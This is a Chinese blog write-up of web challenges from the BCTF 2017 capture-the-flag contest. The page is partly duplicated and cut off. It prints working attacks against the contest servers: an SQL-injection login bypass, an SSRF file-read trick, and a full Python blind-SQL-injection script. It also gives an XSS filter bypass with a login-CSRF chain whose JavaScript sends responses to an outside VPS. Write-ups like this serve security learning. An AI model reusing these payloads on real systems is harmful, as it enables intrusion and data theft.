<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">

<html lang="zh-CN">
<head>
<meta charset="utf-8"/>
<meta content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no" name="viewport"/>
<title>Bendawang's Site</title>
<link href="./BCTF-2017-WEB-WriteUp/font-awesome.min.css" rel="stylesheet"/>
<link href="./BCTF-2017-WEB-WriteUp/screen.css" rel="stylesheet"/>
<link href="./BCTF-2017-WEB-WriteUp/prism_okaidia.css" rel="stylesheet"/>
<link href="./BCTF-2017-WEB-WriteUp/bendawang.css" rel="stylesheet"/>
<script src="./BCTF-2017-WEB-WriteUp/jquery.min.js"></script>
</head>
<body class="wrap">
<header>
<nav class="mobile-nav show-on-mobiles">
<ul>
<li class="">
<a href="/index">归档</a></li>
<li class="">
<a href="/time">时间</a></li>
<!--<li class="">
            <a href="/category">标签</a></li>-->
<li class="">
<a href="/friendlink">友链</a></li>
<li class="">
<a href="/about">about</a></li>
</ul>
</nav>
<div class="show-on-mobiles">
<h1>
<a href="/">
<span>Bendawang</span>
<img src="./BCTF-2017-WEB-WriteUp/bendawang.png" style="display:block;width:100%;"/></a>
</h1>
</div>
<div class="grid hide-on-mobiles">
<div class="unit test2 hide-on-mobiles">
<h1>
<a href="/">
<span>Bendawang</span>
<img alt="" height="115" src="./BCTF-2017-WEB-WriteUp/bendawang.png" width="449"/></a>
</h1>
</div>
<nav class="main-nav unit test1 hide-on-mobiles">
<ul>
<li></li><li></li><li></li><li></li><li></li>
<li></li><li></li><li></li><li></li><li></li>
<li></li><li></li><li></li><li></li><li></li>
<li class="">
<a href="/index">归档</a></li>
<li class="">
<a href="/time">时间</a></li>
<!--<li class="">
            <a href="/category">标签</a></li>-->
<li class="">
<a href="/friendlink">友链</a></li>
<li class="">
<a href="/about">about</a></li>
</ul>
</nav>
</div>
</header>
<script>
$('document').ready(function(){
    $('li[class]:eq(4)').attr('class','current');
});
</script>
<section class="docs">
<div class="grid">
<!--移动端-->
<div class="show-on-mobiles">
<div class="article-info profile-block">
<div class="article-info-block">
               55
               <span>文章</span>
</div>
<div class="article-info-block">
               5
               <span>标签</span>
</div>
</div>
<div class="profile-block social-links">
<table>
<tbody><tr>
<td>
<a href="https://github.com/530393297" target="_blank" title="github">
<i class="fa fa-github"></i></a>
</td>
<td>
<a href="tencent://message/?uin=1814054026&amp;Site=有事Q我&amp;Menu=yes" target="_blank" title="qq">
<i class="fa fa-qq"></i></a>
</td>
<td>
<a href="http://weibo.com/2734326455/profile" target="_blank" title="weibo">
<i class="fa fa-weibo"></i></a>
</td>
<td>
<a href="http://bendawang.site/rss" target="_blank" title="rss">
<i class="fa fa-rss-square"></i></a>
</td>
</tr>
</tbody></table>
</div>
<div class="whole show-on-mobiles">
<article class="bdw_article">
<div class="Bendawang" id="Bendawang_mobile">
<b id="Bendawang_toggle_mobile" title="收起">目录[+]</b></div></article></div></div></div></section></body></html>
<div class="Bendawang_content" id="Bendawang_content_mobile"></div>

<br/>
<br/>
<h1 id="bctf2017webwriteup">BCTF 2017 WEB WriteUp</h1>
<p style="max-width:100%;height:auto;">感觉这次比赛的题尤其火日师傅的出的两个出得相当完美，感觉出得非常好，其他题目感觉或多或少都做的有点迷，还是太菜了，总之还是慢慢来，最近事情又堆起来了，慢慢来，回头抽时间吧这段时间的东西慢慢整理下发出来好了。</p>
<h2 id="basysqli">basy sqli</h2>
<p style="max-width:100%;height:auto;">总之这道题反正挺迷的。。两道web和一道reverse都对应了这一个链接。点开看是一个登录界面，然后简单的把用户名设为<code style="max-width:100%;height:auto;">admin&amp;apos;#</code>就登陆进去了，本来看题目名称还以为这里能注入拿一个<code style="max-width:100%;height:auto;">flag</code>，然后又回去折腾注入，折腾了40分钟，实在是不行了，感觉根本注不了，就放弃了。先登进去看看好了，登进去，发现能买东西，也能下载，下下来有什么<code style="max-width:100%;height:auto;">a，b，c</code>等等之类的，然后买东西时候抓个包试了试买其他东西，买<code style="max-width:100%;height:auto;">a</code>成功，买<code style="max-width:100%;height:auto;">b</code>出一串奇怪的东西，买<code style="max-width:100%;height:auto;">c</code>说钱不够，买<code style="max-width:100%;height:auto;">d</code>，flag出来了。。。迷。。。还好之前放弃了登陆框那儿的注入。。。。
后来简单扫扫目录才意识到问题，扫目录扫到个<code style="max-width:100%;height:auto;">.viminfo</code>，然后跟着提示最后找到一个<code style="max-width:100%;height:auto;">zip</code>压缩包，里面是个linux可执行程序
<br/><img alt="" data-action="zoom" src="./BCTF-2017-WEB-WriteUp/58f387257cc5804669000004.png" style="max-width:100%;height:auto;"/><br/>
d对应的本题的flag，所以大概应该是这样把，b选项对应另一个web的flag，然后d选项对应reverse的flag。总之跟我无关了。。。结果到头来还是不觉得这两个web题和web有多大关系。</p>
<h2 id="paint">paint</h2>
<p style="max-width:100%;height:auto;">进去是一个画板，然后简单fuzz了一会发现功能很少，可能有用的地方就两个，一个是上传图片的<code style="max-width:100%;height:auto;">upload.php</code>，另一个是转换图片的<code style="max-width:100%;height:auto;">imag.php</code>，，而上传图片只会验证之后改改文件名就存起来，但是<code style="max-width:100%;height:auto;">image.php</code>会把你的url指向的图片通过GD库转换之后存起来，这一点自己对比转换前后的图片就能看出来，另外还有一个<code style="max-width:100%;height:auto;">flag.php</code>,访问得到的结果说是一定要本地用户访问才有<code style="max-width:100%;height:auto;">flag</code>。</p>
<p style="max-width:100%;height:auto;">然后先简单测试了下，感觉不想是ssrf，，虽然过滤了<code style="max-width:100%;height:auto;">127.0.0.1</code>，不过通过<code style="max-width:100%;height:auto;">127.0.x.x</code>都能访问回本地，比如<code style="max-width:100%;height:auto;">127.0.0.1</code>，索性我们尝试访问<code style="max-width:100%;height:auto;">flag</code>,发现两种情况的大小是不同的
<br/><img alt="" data-action="zoom" src="./BCTF-2017-WEB-WriteUp/58f38b157cc5804669000008.png" style="max-width:100%;height:auto;"/><br/>
<br/><img alt="" data-action="zoom" src="./BCTF-2017-WEB-WriteUp/58f38b2c7cc5804669000009.png" style="max-width:100%;height:auto;"/><br/>
说明第二个确实访问到了flag，而且flag.php的大小是374字节。但是由于不是图片，转换失败导致没有办法看到。</p>
<p style="max-width:100%;height:auto;">然后我们尝试把<code style="max-width:100%;height:auto;">image.php</code>指向我们的vps，发现它真的访问过来了，并且根据收到的请求包判断是<code style="max-width:100%;height:auto;">curl</code>，然后进行测试是否是命令行的<code style="max-width:100%;height:auto;">curl</code>命令，看看是否有机会进行命令执行，发现过滤比较严格，重要的命令执行符号，像是<code style="max-width:100%;height:auto;">|</code>，<code style="max-width:100%;height:auto;">;</code>，空格，美元符号等都被过滤了，但是我们通过大括号就能判断它确实是执行了<code style="max-width:100%;height:auto;">curl</code>命令，例如<code style="max-width:100%;height:auto;">url=http://127.0.0.2/{uploads/1492355833x2dDz34y.gif,flag.php}</code>，这样得到的结果大小等于两者大小之和，所以思路就来了，我们将一个正常图片和flag放到一起然后使其能够转换成图片，然后我们把图片下载下载就能获取到flag。但是我们要考虑一个问题，就是flag的内容也有可能被转换，那很好解决，我们找一张图片上传上去，然后转化后和原图进行对比，比如我发现其中从10000字节到11000字节处二者完全相等，即没有被转化的部分，然后把图片的<code style="max-width:100%;height:auto;">0-10000</code>的部分存成<code style="max-width:100%;height:auto;">flag1.gif</code>，把<code style="max-width:100%;height:auto;">10375-结束</code>的部分存成<code style="max-width:100%;height:auto;">flag2.gif</code>，然后两个gif都上传，得到连个文件对应的文件为<code style="max-width:100%;height:auto;">uploads/1492355833x2dDz34y.gif</code>和<code style="max-width:100%;height:auto;">uploads/1492356344HXzAeXX6.gif</code>，然后构造如下请求：</p>
<pre><code style="max-width:100%;height:auto;">url=http://127.0.0.2/{uploads/1492355833x2dDz34y.gif,flag.php,uploads/1492356344HXzAeXX6.gif}
</code></pre>
<p style="max-width:100%;height:auto;">这样把转换的结果图片下载下来打开就能拿到flag了
<br/><img alt="" data-action="zoom" src="./BCTF-2017-WEB-WriteUp/58f38d6d7cc580466900000a.png" style="max-width:100%;height:auto;"/><br/></p>
<h2 id="signature">signature</h2>
<p style="max-width:100%;height:auto;">好吧，这道题才是迷得要死。。。首先是从gayhub上扒到了源码<code style="max-width:100%;height:auto;">https://github.com/xiaobaozidi/bbbccctttffff</code>，然后进入源码审计，先看到了<code style="max-width:100%;height:auto;">license.txt</code>，发现是<code style="max-width:100%;height:auto;">CI</code>框架，果断把真源码下载下来进行对比
<br/><img alt="" data-action="zoom" src="./BCTF-2017-WEB-WriteUp/58f38e957cc580466900000b.png" style="max-width:100%;height:auto;"/><br/>
简单总结下改动，主要就是删了个注册功能，然后加了个能够获取flag的payment功能，另外加了几个这种东西
<br/><img alt="" data-action="zoom" src="./BCTF-2017-WEB-WriteUp/58f38ee07cc580466900000c.png" style="max-width:100%;height:auto;"/><br/>
刚开始简单看了看觉得一点用都没有。。然后就觉得就只有这么点改动就要能进后台触发payment功能，是不是个0day，然后进入了超长的审计时间，最后审到头脑爆炸。。。一直认为是session有问题，然后折腾了好久还是没有什么思路。最后发现在这个<code style="max-width:100%;height:auto;">blog_backup_2014.php</code>里面有这个
<br/><img alt="" data-action="zoom" src="./BCTF-2017-WEB-WriteUp/58f38ffb7cc580466900000e.png" style="max-width:100%;height:auto;"/><br/>
意思是访问它一下就直接登陆进去了。。。。
黑人问号.jpg....
访问<code style="max-width:100%;height:auto;">http://payment.bctf.xctf.org.cn/index.php/blog_backup_2014</code>。。
然后进去输入<code style="max-width:100%;height:auto;">userid</code>的地方有个注入，是个盲注，然后关于拿<code style="max-width:100%;height:auto;">flag</code>的payment功能需要输入一大堆不知道的东西，所以还是先去盲注把。最后脚本如下：</p>
<pre><code class="python language-python" style="max-width:100%;height:auto;">import requests
import re
db_length=-1
db_name=""
url = &amp;apos;http://payment.bctf.xctf.org.cn/index.php/admin&amp;apos;
r=requests.session()
r.get("http://payment.bctf.xctf.org.cn/index.php/blog_backup_2014")

def doinject(param):
    #print param
    data={&amp;apos;userid&amp;apos;:param}
    result=r.post(url,data=data)
    content=result.content
    #print content
    if "Congraution!" in content:
        return 1
    elif "Wrong userid" in content:
        return 0
    else:
        return -1
ans=""
&amp;apos;&amp;apos;&amp;apos;
for i in xrange(1,100):
    start=1
    end=127
    while(start!=end):
        print str(start)+" : "+str(end)
        if(end-start==1):
            param="1&amp;apos;||if(ascii(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name=&amp;apos;sourcekey&amp;apos;)),"+str(i)+",1))&gt;&amp;apos;"+str(start)+"&amp;apos;,1,0)#"
            if doinject(param)==1:
                end=start
            else:
                start=end
        else:
            mid=(start+end)/2
            param="1&amp;apos;||if(ascii(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name=&amp;apos;sourcekey&amp;apos;)),"+str(i)+",1))&gt;&amp;apos;"+str(mid)+"&amp;apos;,1,0)#"
            #print param
            tag=doinject(param)
            if tag==1:
                start=mid
            elif tag==-1:
                end+=1
            else:
                end=mid
    ans+=chr(start)
    print ans
print ans
&amp;apos;&amp;apos;&amp;apos;
for i in xrange(1,1000):
    start=1
    end=127
    while(start!=end):
        print str(start)+" : "+str(end)
        if(end-start==1):
            param="1&amp;apos;||if((select(group_concat(md5_key))from(sourcekey))&gt;&amp;apos;"+ans+chr(start)+"&amp;apos;,1,0)#"
            if(doinject(param)):
                end=start
            else:
                start=end
        else:
            mid=(start+end)/2
            param="1&amp;apos;||if((select(group_concat(md5_key))from(sourcekey))&gt;&amp;apos;"+ans+chr(mid)+"&amp;apos;,1,0)#"
            #print param
            tag=doinject(param)
            if(tag):
                start=mid
            elif tag==-1:
                end+=1
            else:
                end=mid
    ans+=chr(start)
    print ans
print ans


&amp;apos;&amp;apos;&amp;apos;

table:payment,sourcekey,users
column:
1==&gt;USERID,BILLNO,BANKNAME,SERVICETYPE

C33506,C91536,K44098,K55106,M50655
45156890612662948,45022786012413371,89321845293416108,81671845408172653,33465675673245562
HSBC,HSBC,CMB,CMB,CSA
CARD_PAY

2==&gt;BANKNAME,MD5_KEY
CBC,CMB,CSB,HSBC
02359DC1A4D2612AAC83872031D970B9,6C35EBC95955C672EAD533295587FE07,ABB0A201345974F3DBF641EA2F8686CB,073A6AB30B859E326719E18A35DE17B4

3==&gt;geile
&amp;apos;&amp;apos;&amp;apos;
</code></pre>
<p style="max-width:100%;height:auto;">然后拿着数据去输入就行了，注意这个<code style="max-width:100%;height:auto;">Signature</code>
<br/><img alt="" data-action="zoom" src="./BCTF-2017-WEB-WriteUp/58f3910f7cc580466900000f.png" style="max-width:100%;height:auto;"/><br/>
算法已经在<code style="max-width:100%;height:auto;">m_payment.php</code>给出</p>
<pre><code style="max-width:100%;height:auto;"> function tosignature($userid,$bankname,$billno,$servicetype,$md5_key)
     {
        $arr=array($userid,$bankname,$billno,$servicetype,$md5_key);
        return md5(join(&amp;apos;&amp;&amp;apos;,$arr));
    }
</code></pre>
<p style="max-width:100%;height:auto;">然后输入就拿到flag了。
<br/><img alt="" data-action="zoom" src="./BCTF-2017-WEB-WriteUp/58f391887cc5804669000010.png" style="max-width:100%;height:auto;"/><br/></p>
<p style="max-width:100%;height:auto;">所以说这么一道题给这么大一坨源码是个什么tm鬼。。。
迷。。。。。。。。</p>
<h2 id="diary">Diary</h2>
<p style="max-width:100%;height:auto;">说道这个题，我有一句mmp必须要讲，当然不是说题，而是说自己，这道题个人认为出的相当好，我要打分至少打到4.5以上。不过也真是烦，这个题做了整整6个小时才做出来，最后总结主要被两个点坑了，一个是我tm把我xss平台的ip打错了，白白浪费快一个小时，因为我本地测用的本地的js，提交的时候用的vps上的js，导致很久很久都没发现错在哪儿，这是第一个点，第二个点是这道题有涉及到延迟，但是当你延迟太久服务器可能就会丢弃的你的这次操作了，比如同样的代码，最开始我设置的延迟10s，就失败了，但是本地是成功的.然后一直找不到问题所在，很难受，后来改成6s就成功了.
总之还有很多其他问题，暴露出我太粗心了，各种地方犯各种问题，而且一但出现问题就更加焦躁，然后就死循环了。。。僵硬。。。</p>
<p style="max-width:100%;height:auto;">回到题目上来把。
先随便注册个账户，然后登陆，注意这里在登陆的时候完成了一个跳转，这个点对于后面的绕过很重要，</p>
<p style="max-width:100%;height:auto;"><br/><img alt="" data-action="zoom" src="./BCTF-2017-WEB-WriteUp/58f37f3e7cc5804669000002.png" style="max-width:100%;height:auto;"/><br/></p>
<p style="max-width:100%;height:auto;">通过burp抓包也能看出来，当输入用户名密码点击登陆的时候，
有如下的请求过程</p>
<pre><code style="max-width:100%;height:auto;">1.用户名密码token和next参数发往==&gt;auth.bctf.xctf.org.cn/accounts/login/
2.被302去访问auth.bctf.xctf.org.cn/o/authorize/
3.再次被302至http://diary.bctf.xctf.org.cn/这里
</code></pre>
<p style="max-width:100%;height:auto;">其中在第三次的过程中完成了从<code style="max-width:100%;height:auto;">auth.bctf.xctf.org.cn</code>跳转至<code style="max-width:100%;height:auto;">diary.bctf.xctf.org.cn</code>的过程并且其中携带的code后续可以用来验证身份。</p>
<p style="max-width:100%;height:auto;">登陆进去之后发现一个地方输入，一个地方有表单提交(ps:管理员提交的话就可以获得flag)，一个地方提交url。</p>
<p style="max-width:100%;height:auto;">那么多半就是xss，先看输入的地方，发现输入之后打印的时候会经过<code style="max-width:100%;height:auto;">filter.js</code>的过滤，简单看了下<code style="max-width:100%;height:auto;">filter.js</code>的源码，没有仔细看，大概就是下面的标签不能用，<code style="max-width:100%;height:auto;">script form object embed link meta svg use math video marquee isindex bgsound</code>，然后像是<code style="max-width:100%;height:auto;">on事件，src,href</code>等重要属性也用不了，但是很容易发现他没有禁用<code style="max-width:100%;height:auto;">iframe</code>，这样很容易也就能想办法绕过
在这个链接<code style="max-width:100%;height:auto;">https://html5sec.org/</code>找到这么个payload成功绕过</p>
<pre><code class="html language-html" style="max-width:100%;height:auto;">&lt;iframe srcdoc="&lt;img src=x onerror=&amp;apos;alert(1);&amp;apos;&gt;"&gt;
</code></pre>
<p style="max-width:100%;height:auto;">然后就能放我们script标签执行js了。
好的xss的点有了，现在要想办法让管理员能触发，提交的url那儿限制很死几乎无法利用，需要找一个可以跳转的地方好跳转至我们控制的页面。
后来发现<code style="max-width:100%;height:auto;">static</code>链接有问题，这样子<code style="max-width:100%;height:auto;">http://diary.bctf.xctf.org.cn/static/%5c%5cbaidu.com</code>能够成功跳转值百度，这样的话又有了跳转，但是还有一个问题，要想要让管理员去<code style="max-width:100%;height:auto;">/survey/</code>处提交表单获得flag，有token怎么办。。</p>
<p style="max-width:100%;height:auto;">具体的可以看这篇文章，和本题目几乎一样<code style="max-width:100%;height:auto;">https://whitton.io/articles/uber-turning-self-xss-into-good-xss/</code>，一个组合利用。</p>
<p style="max-width:100%;height:auto;">这里我就不再赘述原理了，直接讲方法，之类我给出了两种实现方式，说是两种其实就是类似而已。</p>
<p style="max-width:100%;height:auto;">第一种，根据文章描述的原理，
首先我们在自己账户插入xss的payload如下</p>
<pre><code class="html language-html" style="max-width:100%;height:auto;">&lt;iframe srcdoc="&lt;script src=&amp;apos;http://diary.bctf.xctf.org.cn/static/js/jquery.min.js&amp;apos;&gt;&lt;/script&gt;&lt;script src=&amp;apos;http://104.160.43.154:8000/myjs/post.js&amp;apos;&gt;&lt;/script&gt;"&gt;
</code></pre>
<p style="max-width:100%;height:auto;">由于该iframe和父页同源，所以通过该js文件创建我们需要的另一个用于退出我们自己账户然后登陆管理员账户的<code style="max-width:100%;height:auto;">iframe</code>
该<code style="max-width:100%;height:auto;">post.js</code>内容如下：</p>
<pre><code class="js language-js" style="max-width:100%;height:auto;">var loginIframe = window.top.document.createElement(&amp;apos;iframe&amp;apos;);
loginIframe.setAttribute(&amp;apos;src&amp;apos;, &amp;apos;http://104.160.43.154:8000/myjs/in_and_out.html&amp;apos;);
window.top.document.body.appendChild(loginIframe);
setTimeout(function() {
    $.post("http://diary.bctf.xctf.org.cn/survey/",
        {
            rate:&amp;apos;5&amp;apos;,
            suggestion:&amp;apos;123&amp;apos;,
            csrfmiddlewaretoken:document.cookie.split(&amp;apos;;&amp;apos;)[0].split(&amp;apos;=&amp;apos;)[1]
           },
        function (data){
            $.get("http://xss平台?a="+escape(data),functoon(data,status){});
        }
    );
}, 6000);
</code></pre>
<p style="max-width:100%;height:auto;">然后我们的<code style="max-width:100%;height:auto;">in_and_out.html</code>的内容如下：</p>
<pre><code class="html language-html" style="max-width:100%;height:auto;">&lt;meta http-equiv="Content-Security-Policy" content="img-src http://diary.bctf.xctf.org.cn/"&gt;
&lt;img src="http://diary.bctf.xctf.org.cn/accounts/logout/" onerror="redir();"&gt;
&lt;script&gt;
    var redir = function() {
        window.location = &amp;apos;http://diary.bctf.xctf.org.cn/accounts/login/&amp;apos;;
    };
&lt;/script&gt;
</code></pre>
<p style="max-width:100%;height:auto;">我们在vps上的构造一个<code style="max-width:100%;height:auto;">fake.html</code>如下:</p>
<pre><code class="html language-html" style="max-width:100%;height:auto;">&lt;meta http-equiv="Content-Security-Policy" content="img-src http://diary.bctf.xctf.org.cn/"&gt;
&lt;img src="http://diary.bctf.xctf.org.cn/accounts/logout/" onerror="login();"&gt;
&lt;script&gt;
    var login = function() {
        var loginImg = document.createElement(&amp;apos;img&amp;apos;);
        loginImg.src = "http://diary.bctf.xctf.org.cn/accounts/login/";
        loginImg.onerror = redir;
    }
    var redir = function() {
        var code="d4SOl5u07GvJhsz5co1V084hGrQLoz";
        //这里code就是之前说的登陆的时候抓包拦下来的，抓到之后不发出去，把code复制出来，那个请求等他晾在那儿别发出去了
        var loginImg2 = document.createElement(&amp;apos;img&amp;apos;);
        loginImg2.src = &amp;apos;http://diary.bctf.xctf.org.cn/o/receive_authcode?state=preauth&amp;code=&amp;apos;+code;
        loginImg2.onerror = function() {
            window.location = &amp;apos;http://diary.bctf.xctf.org.cn/diary/&amp;apos;;
        }
    }
&lt;/script&gt;
</code></pre>
<p style="max-width:100%;height:auto;">然后提交构造的链接让它跳到<code style="max-width:100%;height:auto;">fake.html</code>来，然后就能够成功实现攻击。。注意每重复一次都得重新抓去一次code。</p>
<p style="max-width:100%;height:auto;">第二种就是不通过js文件创建iframe，直接在payload里面放就行了，其实是一样的，我们在自己账户插入xss的payload如下</p>
<pre><code class="html language-html" style="max-width:100%;height:auto;">&lt;iframe srcdoc="&lt;script+src%3d&amp;apos;http%3a//diary.bctf.xctf.org.cn/static/js/jquery.min.js&amp;apos;&gt;&lt;/script&gt;&lt;script+src%3d&amp;apos;http%3a//104.160.43.154%3a8000/myjs/post.js&amp;apos;&gt;&lt;/script&gt;"&gt;&lt;/iframe&gt; &lt;iframe srcdoc="&lt;meta+http-equiv%3d&amp;apos;Content-Security-Policy&amp;apos;+content%3d&amp;apos;img-src+http%3a//diary.bctf.xctf.org.cn/&amp;apos;&gt;&lt;img+src%3d&amp;apos;http%3a//diary.bctf.xctf.org.cn/accounts/logout/&amp;apos;+onerror%3d&amp;apos;redir()%3b&amp;apos;&gt;&lt;script&gt;var+redir+%3d+function()+{window.location+%3d+&amp;apos;http%3a//diary.bctf.xctf.org.cn/accounts/login/&amp;apos;%3b}%3b&lt;/script&gt;"&gt;&lt;/iframe&gt;
</code></pre>
<p style="max-width:100%;height:auto;">然后<code style="max-width:100%;height:auto;">post.js</code>就可以直接这样子，把功能分开免得出问题</p>
<pre><code class="js language-js" style="max-width:100%;height:auto;">setTimeout(function() {$.post("http://diary.bctf.xctf.org.cn/survey/",
{
    rate:&amp;apos;5&amp;apos;,
    suggestion:&amp;apos;nosuggest&amp;apos;,
    csrfmiddlewaretoken:document.cookie.split(&amp;apos;;&amp;apos;)[0].split(&amp;apos;=&amp;apos;)[1]
},
function(data,status){
    $.get("http://104.160.43.154:8000/xss/?a="+escape(data),function(data,status){});
}
)},6000)
</code></pre>
<p style="max-width:100%;height:auto;">最终获取到的flag如下：
<br/><img alt="" data-action="zoom" src="./BCTF-2017-WEB-WriteUp/58f3867f7cc5804669000003.png" style="max-width:100%;height:auto;"/><br/></p>
<p style="max-width:100%;height:auto;">这道题收获很大，因为现在有很多地方都是利用这样的跳转进行身份认证，但是从来没有想过有这种方式再配合上<code style="max-width:100%;height:auto;">csp</code>去进行利用，膜拜姿势orz。。。平时想的还是太少了。。思维僵化。。。</p>
<h2 id="aliceandbob">Alice and Bob</h2>
<p style="max-width:100%;height:auto;">又是一道史诗级谜题。。。
迷。。。
各种奇怪的不合逻辑的返回
猜测是预编译把，不知道怎么搞得。
最后师傅做出来的。。。
<br/><img alt="" data-action="zoom" src="./BCTF-2017-WEB-WriteUp/58f392737cc5804669000011.png" style="max-width:100%;height:auto;"/><br/>
不懂。。。
迷。。。。
回头看看别人wp学习下。。。</p>
<div class="section-nav">
<div class="left align-right"></div>
<div class="right align-left"></div>
<div class="clear"></div>
</div>



<!--PC端-->
<div class="unit one-fifth hide-on-mobiles" id="scroll" style="position:absolute;left:30px">
<div class="inner profile-inner">
<div class="base-info profile-block">
<img id="avatar" src="./BCTF-2017-WEB-WriteUp/logo.jpg"/>
<h2 id="name" style="text-align:center">Bendawang</h2>
<span id="location" style="font-size:18px">
<i class="fa fa-map-marker"></i>SiChuan, China</span>
<a href="/about" id="follow">联系我</a></div>
<div class="article-info profile-block">
<div class="article-info-block">
        55
          <span>文章</span></div>
<div class="article-info-block">
        5
          <span>标签</span></div>
</div>
<div class="profile-block social-links hide-on-mobiles">
<table>
<tbody>
<tr>
<td>
<a href="https://github.com/530393297" target="_blank" title="github">
<i class="fa fa-github"></i>
</a>
</td>
<td>
<a href="tencent://message/?uin=1814054026&amp;Site=有事Q我&amp;Menu=yes" target="_blank" title="qq">
<i class="fa fa-qq"></i>
</a>
</td>
<td>
<a href="http://weibo.com/2734326455/profile" target="_blank" title="weibo">
<i class="fa fa-weibo"></i>
</a>
</td>
<td>
<a href="http://bendawang.site/rss" target="_blank" title="rss">
<i class="fa fa-rss-square"></i></a>
</td>
</tr>
</tbody>
</table>
</div>
</div>
</div>
<div class="unit three-quarters hide-on-mobiles">
<article class="bdw_article">
<h1 id="bctf2017webwriteup">BCTF 2017 WEB WriteUp</h1>
<p style="max-width:100%;height:auto;">感觉这次比赛的题尤其火日师傅的出的两个出得相当完美，感觉出得非常好，其他题目感觉或多或少都做的有点迷，还是太菜了，总之还是慢慢来，最近事情又堆起来了，慢慢来，回头抽时间吧这段时间的东西慢慢整理下发出来好了。</p>
<h2 id="basysqli">basy sqli</h2>
<p style="max-width:100%;height:auto;">总之这道题反正挺迷的。。两道web和一道reverse都对应了这一个链接。点开看是一个登录界面，然后简单的把用户名设为<code style="max-width:100%;height:auto;">admin&amp;apos;#</code>就登陆进去了，本来看题目名称还以为这里能注入拿一个<code style="max-width:100%;height:auto;">flag</code>，然后又回去折腾注入，折腾了40分钟，实在是不行了，感觉根本注不了，就放弃了。先登进去看看好了，登进去，发现能买东西，也能下载，下下来有什么<code style="max-width:100%;height:auto;">a，b，c</code>等等之类的，然后买东西时候抓个包试了试买其他东西，买<code style="max-width:100%;height:auto;">a</code>成功，买<code style="max-width:100%;height:auto;">b</code>出一串奇怪的东西，买<code style="max-width:100%;height:auto;">c</code>说钱不够，买<code style="max-width:100%;height:auto;">d</code>，flag出来了。。。迷。。。还好之前放弃了登陆框那儿的注入。。。。
后来简单扫扫目录才意识到问题，扫目录扫到个<code style="max-width:100%;height:auto;">.viminfo</code>，然后跟着提示最后找到一个<code style="max-width:100%;height:auto;">zip</code>压缩包，里面是个linux可执行程序
<br/><img alt="" data-action="zoom" src="./BCTF-2017-WEB-WriteUp/58f387257cc5804669000004.png" style="max-width:100%;height:auto;"/><br/>
d对应的本题的flag，所以大概应该是这样把，b选项对应另一个web的flag，然后d选项对应reverse的flag。总之跟我无关了。。。结果到头来还是不觉得这两个web题和web有多大关系。</p>
<h2 id="paint">paint</h2>
<p style="max-width:100%;height:auto;">进去是一个画板，然后简单fuzz了一会发现功能很少，可能有用的地方就两个，一个是上传图片的<code style="max-width:100%;height:auto;">upload.php</code>，另一个是转换图片的<code style="max-width:100%;height:auto;">imag.php</code>，，而上传图片只会验证之后改改文件名就存起来，但是<code style="max-width:100%;height:auto;">image.php</code>会把你的url指向的图片通过GD库转换之后存起来，这一点自己对比转换前后的图片就能看出来，另外还有一个<code style="max-width:100%;height:auto;">flag.php</code>,访问得到的结果说是一定要本地用户访问才有<code style="max-width:100%;height:auto;">flag</code>。</p>
<p style="max-width:100%;height:auto;">然后先简单测试了下，感觉不想是ssrf，，虽然过滤了<code style="max-width:100%;height:auto;">127.0.0.1</code>，不过通过<code style="max-width:100%;height:auto;">127.0.x.x</code>都能访问回本地，比如<code style="max-width:100%;height:auto;">127.0.0.1</code>，索性我们尝试访问<code style="max-width:100%;height:auto;">flag</code>,发现两种情况的大小是不同的
<br/><img alt="" data-action="zoom" src="./BCTF-2017-WEB-WriteUp/58f38b157cc5804669000008.png" style="max-width:100%;height:auto;"/><br/>
<br/><img alt="" data-action="zoom" src="./BCTF-2017-WEB-WriteUp/58f38b2c7cc5804669000009.png" style="max-width:100%;height:auto;"/><br/>
说明第二个确实访问到了flag，而且flag.php的大小是374字节。但是由于不是图片，转换失败导致没有办法看到。</p>
<p style="max-width:100%;height:auto;">然后我们尝试把<code style="max-width:100%;height:auto;">image.php</code>指向我们的vps，发现它真的访问过来了，并且根据收到的请求包判断是<code style="max-width:100%;height:auto;">curl</code>，然后进行测试是否是命令行的<code style="max-width:100%;height:auto;">curl</code>命令，看看是否有机会进行命令执行，发现过滤比较严格，重要的命令执行符号，像是<code style="max-width:100%;height:auto;">|</code>，<code style="max-width:100%;height:auto;">;</code>，空格，美元符号等都被过滤了，但是我们通过大括号就能判断它确实是执行了<code style="max-width:100%;height:auto;">curl</code>命令，例如<code style="max-width:100%;height:auto;">url=http://127.0.0.2/{uploads/1492355833x2dDz34y.gif,flag.php}</code>，这样得到的结果大小等于两者大小之和，所以思路就来了，我们将一个正常图片和flag放到一起然后使其能够转换成图片，然后我们把图片下载下载就能获取到flag。但是我们要考虑一个问题，就是flag的内容也有可能被转换，那很好解决，我们找一张图片上传上去，然后转化后和原图进行对比，比如我发现其中从10000字节到11000字节处二者完全相等，即没有被转化的部分，然后把图片的<code style="max-width:100%;height:auto;">0-10000</code>的部分存成<code style="max-width:100%;height:auto;">flag1.gif</code>，把<code style="max-width:100%;height:auto;">10375-结束</code>的部分存成<code style="max-width:100%;height:auto;">flag2.gif</code>，然后两个gif都上传，得到连个文件对应的文件为<code style="max-width:100%;height:auto;">uploads/1492355833x2dDz34y.gif</code>和<code style="max-width:100%;height:auto;">uploads/1492356344HXzAeXX6.gif</code>，然后构造如下请求：</p>
<pre><code style="max-width:100%;height:auto;">url=http://127.0.0.2/{uploads/1492355833x2dDz34y.gif,flag.php,uploads/1492356344HXzAeXX6.gif}
</code></pre>
<p style="max-width:100%;height:auto;">这样把转换的结果图片下载下来打开就能拿到flag了
<br/><img alt="" data-action="zoom" src="./BCTF-2017-WEB-WriteUp/58f38d6d7cc580466900000a.png" style="max-width:100%;height:auto;"/><br/></p>
<h2 id="signature">signature</h2>
<p style="max-width:100%;height:auto;">好吧，这道题才是迷得要死。。。首先是从gayhub上扒到了源码<code style="max-width:100%;height:auto;">https://github.com/xiaobaozidi/bbbccctttffff</code>，然后进入源码审计，先看到了<code style="max-width:100%;height:auto;">license.txt</code>，发现是<code style="max-width:100%;height:auto;">CI</code>框架，果断把真源码下载下来进行对比
<br/><img alt="" data-action="zoom" src="./BCTF-2017-WEB-WriteUp/58f38e957cc580466900000b.png" style="max-width:100%;height:auto;"/><br/>
简单总结下改动，主要就是删了个注册功能，然后加了个能够获取flag的payment功能，另外加了几个这种东西
